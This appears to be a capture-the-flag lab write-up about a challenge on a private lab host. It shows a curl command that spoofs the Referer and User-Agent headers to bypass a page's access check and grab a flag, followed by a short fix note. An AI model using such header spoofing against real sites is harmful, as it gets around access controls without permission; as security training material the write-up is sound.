## 9- CUSTOM USER AGENT AND REFERER
### How to reproduce :
in this page:
`http://10.11.100.7/?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c`
source code we found some interessed comments:
`You must cumming from : "https://www.nsa.gov/" to go to the next step` and `Let's use this browser : "ft_bornToSec". It will help you a lot.`

so send a request with curl with this specific user agent and referer:

`curl 'http://10.11.100.7/?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c' \
-H 'Referer: https://www.nsa.gov/' \
-H 'User-Agent: ft_bornToSec' | grep flag`

and we get the flag.

### How to Fix :
Don't use USER AGENT AND REFERER as a replacement of the authentication